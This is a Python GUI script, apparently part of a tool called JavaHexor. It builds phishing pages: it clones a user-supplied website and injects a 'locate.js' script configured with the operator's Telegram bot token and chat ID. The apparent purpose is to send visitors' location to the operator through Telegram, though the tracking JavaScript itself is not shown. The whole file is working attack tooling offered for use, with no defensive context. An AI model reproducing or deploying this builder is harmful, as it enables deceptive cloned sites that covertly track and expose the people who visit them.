#!/usr/bin/python3
"""
Script are Created and Managed By SMukx
For More info Visit JavaHexor -> https://github.com/Whitecat18/javahexor
"""

import os
import requests
import tkinter as tk
from tkinter import messagebox, filedialog


def create_files():
    bot_token = bot_token_entry.get()
    chat_id = chat_id_entry.get()

    key_content = f"const botToken = '{bot_token}';\nconst chatId = '{chat_id}';"

    script_folder = "script"
    os.makedirs(script_folder, exist_ok=True)
    key_file_path = os.path.join(script_folder, "key.txt")
    with open(key_file_path, "w") as key_file:
        key_file.write(key_content)

    messagebox.showinfo("Success", "key.txt file created successfully in the script folder.")

    js_file_path = "locate.js"
    with open(js_file_path, "r") as js_file:
        js_file_content = js_file.read()

    modified_js_content = key_content + "\n\n" + js_file_content

    modified_js_file_path = os.path.join(script_folder, "locate.js")
    with open(modified_js_file_path, "w") as modified_js_file:
        modified_js_file.write(modified_js_content)

    messagebox.showinfo("Success", "Modified locate.js file saved successfully in the script folder.")


def clone_website():
    website_url = website_url_entry.get()

    response = requests.get(website_url)
    html_content = response.text

    index_file_path = os.path.join("script", "index.html")
    with open(index_file_path, "w") as index_file:
        index_file.write(html_content)

    messagebox.showinfo("Success", "Cloned website saved as index.html in the script folder.")

    modified_html_content = html_content + f'\n\n<script src="locate.js"></script>'

    modified_index_file_path = os.path.join("script", "index.html")
    with open(modified_index_file_path, "w") as modified_index_file:
        modified_index_file.write(modified_html_content)

    messagebox.showinfo("Success", "Modified index.html file saved successfully in the script folder.")


def browse_folder():
    folder_path = filedialog.askdirectory()
    script_folder_entry.delete(0, tk.END)
    script_folder_entry.insert(tk.END, folder_path)


window = tk.Tk()
window.title("Website Cloner")
window.geometry("400x200")

tk.Label(window, text="TELEGRAM_BOT_API_KEY:").grid(row=0, column=0, padx=10, pady=10)
bot_token_entry = tk.Entry(window)
bot_token_entry.grid(row=0, column=1, padx=10, pady=10)

tk.Label(window, text="YOUR_CHAT_ID:").grid(row=1, column=0, padx=10, pady=10)
chat_id_entry = tk.Entry(window)
chat_id_entry.grid(row=1, column=1, padx=10, pady=10)

tk.Label(window, text="Website URL:").grid(row=2, column=0, padx=10, pady=10)
website_url_entry = tk.Entry(window)
website_url_entry.grid(row=2, column=1, padx=10, pady=10)

tk.Label(window, text="Script Folder:").grid(row=3, column=0, padx=10, pady=10)
script_folder_entry = tk.Entry(window)
script_folder_entry.grid(row=3, column=1, padx=10, pady=10)

browse_button = tk.Button(window, text="Browse", command=browse_folder)
browse_button.grid(row=3, column=2, padx=10, pady=10)

create_files_button = tk.Button(window, text="Create Files", command=create_files)
create_files_button.grid(row=4, column=0, padx=10, pady=10)

clone_button = tk.Button(window, text="Clone Website", command=clone_website)
clone_button.grid(row=4, column=1, padx=10, pady=10)

tk.Label(window, text="Created and Developed By Smukx", fg="Red").grid(row=5, column=0, columnspan=2, pady=10)

window.mainloop()

